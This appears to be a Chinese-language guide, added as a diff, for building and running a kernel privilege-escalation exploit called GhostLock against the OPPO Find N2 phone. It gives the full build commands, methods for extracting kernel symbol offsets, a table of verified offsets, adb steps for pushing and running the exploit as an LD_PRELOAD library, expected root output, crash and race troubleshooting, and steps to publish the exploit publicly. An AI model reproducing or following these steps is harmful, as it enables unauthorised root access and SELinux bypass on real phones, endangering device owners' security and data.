@@ -1,0 +1,206 @@
+========================================
+GhostLock (CVE-2026-43499) OPPO Find N2 完整指南
+========================================
+
+一、环境准备
+========================================
+
+1. 安装编译工具:
+   sudo apt install -y gcc-11 make flex bison libssl-dev bc libelf-dev dwarves aarch64-linux-gnu-gcc
+
+2. 验证工具:
+   gcc-11 --version
+   aarch64-linux-gnu-gcc --version
+   pahole --version
+
+3. NDK (已下载):
+   ~/android-ndk-cache/android-ndk-r27d/
+
+
+二、从 boot.img 提取 vmlinux
+========================================
+
+方法一: 编译内核 (推荐)
+  cd /home/xiuxiu391/桌面/oppo/kernel_src/android_kernel_oppo_sm8475-oppo-sm8475_b_16.0.0_find_n2
+  export ARCH=arm64 CC=gcc-11 CROSS_COMPILE=aarch64-linux-gnu-
+  make gki_defconfig
+  make vmlinux -j$(nproc)
+
+方法二: extract-vmlinux
+  ./extract-vmlinux /home/xiuxiu391/下载/boot.img > vmlinux
+
+
+三、提取精确偏移
+========================================
+
+1. pahole 提取结构体偏移:
+   pahole -s task_struct vmlinux > task_offsets.txt
+   pahole -s cred vmlinux > cred_offsets.txt
+   pahole -s rt_mutex_waiter vmlinux > waiter_offsets.txt
+
+2. nm 提取符号地址:
+   aarch64-linux-gnu-nm vmlinux | grep -E \
+     "init_task$|root_task_group$|ashmem_fops$|ashmem_ioctl$|\
+      configfs_read_file$|noop_llseek$|generic_file_splice_read$|\
+      nfulnl_logger$|sysctl_bootid$|selinux_state$|\
+      security_hook_heads$|kmalloc_caches$|anon_pipe_buf_ops$" \
+     > symbols.txt
+
+3. 关键偏移说明:
+   INIT_TASK_OFF         - init_task 结构体地址
+   ROOT_TASK_GROUP_OFF   - root_task_group 地址
+   SELINUX_STATE_OFF     - selinux_state 地址
+   ASHMEM_FOPS_OFF       - ashmem_fops 地址
+   ASHMEM_IOCTL_OFF      - ashmem_ioctl 函数
+   NOOP_LLSEEK_OFF       - noop_llseek 函数
+   CONFIGFS_READ_FILE_OFF - configfs_read_file 函数
+   GENERIC_FILE_SPLICE_READ_OFF - generic_file_splice_read 函数
+   NFULNL_LOGGER_OFF     - nfulnl_logger 地址
+   SYSCTL_BOOTID_OFF     - sysctl_bootid 地址
+
+
+四、更新 target.h
+========================================
+
+从 symbols.txt 获取地址，减去 KIMAGE_TEXT_BASE (0xffffffc080000000) 得到偏移。
+
+示例:
+   symbols.txt 中: ffffffc00a7cc000 T init_task
+   target.h 中:    #define INIT_TASK_OFF 0x027cbe20ULL
+
+
+五、编译 exploit
+========================================
+
+cd /home/xiuxiu391/桌面/oppo/oppo-ghostlock-upload/exploit
+
+NDK=~/android-ndk-cache/android-ndk-r27d
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang-18 \
+  --target=aarch64-linux-android35 \
+  --sysroot=$NDK/toolchains/llvm/prebuilt/linux-x86_64/sysroot \
+  -O2 -fPIC -shared \
+  -DTARGET_CONFIG_H=\"targets/oppo-find_n2/target.h\" \
+  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c \
+  src/root.c src/preload.c src/su_blob.S src/wallpaper_blob.S \
+  -pthread -o build/oppo-find_n2/bin/preload.so
+
+
+六、推送到手机并运行
+========================================
+
+1. 检查连接:
+   ./platform-tools/adb devices
+
+2. 推送 exploit:
+   ./platform-tools/adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/preload.so
+
+3. 运行 exploit:
+   ./platform-tools/adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"
+
+4. 正常输出:
+   [+] startup context pid=XXXX uid=2000 euid=2000
+   [+] slide-kaslr-ok pid=XXXX base=XXXXXXXXXXXXXXXX
+   [+] pipe-physrw-summary pid=XXXX root=1
+
+
+七、调试排错
+========================================
+
+问题: 手机重启/崩溃
+原因: 偏移不正确
+解决: 重新用 pahole/nm 提取偏移，确保 target.h 正确
+
+问题: exploit 卡住不动
+原因: 竞态条件失败
+解决: 多次尝试
+
+问题: Permission denied
+解决: adb shell chmod 755 /data/local/tmp/preload.so
+
+问题: 编译错误 (asm_volatile_goto)
+解决: 在 include/linux/compiler-gcc.h 中修改:
+  原: #define asm_volatile_goto(x...) do { asm goto(x); asm (""); } while (0)
+  改: #define asm_volatile_goto(x...) asm goto(x)
+
+问题: 编译错误 (early_param)
+解决: 在 arch/arm64/mm/init.c 中注释掉:
+  early_param("disable_dma32", early_disable_dma32);
+  early_param("mem", early_mem);
+
+
+八、已验证偏移 (OPPO Find N2)
+========================================
+
+  符号                          偏移          验证
+  INIT_TASK_OFF                0x027cbf60    ✓ pid=0,comm=swapper
+  ASHMEM_IOCTL_OFF             0x011ee730    ✓ nm
+  ASHMEM_MMAP_OFF              0x011ef2a0    ✓ nm
+  ASHMEM_OPEN_OFF              0x011ef4e0    ✓ nm
+  ASHMEM_RELEASE_OFF           0x011ef580    ✓ nm
+  ASHMEM_SHOW_FDINFO_OFF       0x011ef6a4    ✓ nm
+  NOOP_LLSEEK_OFF              0x0056cec8    ✓ nm
+  CONFIGFS_READ_FILE_OFF       0x006b046c    ✓ nm
+  GENERIC_FILE_SPLICE_READ_OFF 0x005e6b28    ✓ nm
+
+未验证偏移 (需 pahole 确认):
+  ROOT_TASK_GROUP_OFF, SELINUX_STATE_OFF, SECURITY_HOOK_HEADS_OFF
+  KMALLOC_CACHES_OFF, ANON_PIPE_BUF_OPS_OFF
+  SLIDE_NFULNL_LOGGER_OFF, SLIDE_RANDOM_BOOT_ID_DATA_OFF
+
+
+九、文件结构
+========================================
+
+oppo-ghostlock-upload/
+  README.md                      项目说明
+  DEBUG_GUIDE.md                 调试指南
+  commands.txt                   快速命令参考
+  extract-vmlinux                vmlinux 提取工具
+  exploit/
+    targets/oppo-find_n2/
+      target.h                   OPPO Find N2 偏移配置
+    src/                         exploit 源码
+  kernel_extracted/              内核源文件参考
+
+
+十、上传 GitHub
+========================================
+
+方法1 (gh命令):
+  cd /home/xiuxiu391/桌面/oppo/oppo-ghostlock-upload
+  gh repo create oppo-ghostlock --public --source=. --push
+
+方法2 (手动):
+  1. 打开 https://github.com/new
+  2. 创建仓库: oppo-ghostlock
+  3. 执行:
+     git remote add origin https://github.com/你的用户名/oppo-ghostlock.git
+     git push -u origin master
+
+打包文件: /home/xiuxiu391/桌面/oppo/oppo-ghostlock.tar.gz (506KB)
+
+
+========================================
+文件位置汇总
+========================================
+
+/home/xiuxiu391/桌面/oppo/
+  oppo-ghostlock.tar.gz              打包文件
+  oppo-ghostlock-upload/             上传目录
+    README.md
+    DEBUG_GUIDE.md
+    commands.txt
+    extract-vmlinux
+    exploit/targets/oppo-find_n2/target.h
+    exploit/src/                     (18个源文件)
+  kernel_extracted/                  内核源文件
+  platform-tools/                    ADB 工具
+  kernel_src/                        内核源码
+  kernel_image                       提取的内核二进制
+  vmlinux-to-elf-master/             vmlinux-to-elf 工具
+  peewee-3.17.3/                     Python 依赖
+
+/home/xiuxiu391/下载/
+  boot.img                           原始 boot.img
+  android_kernel_oppo_sm8475-*.zip   内核源码
+  android-ndk-r27d-linux.zip         Android NDK
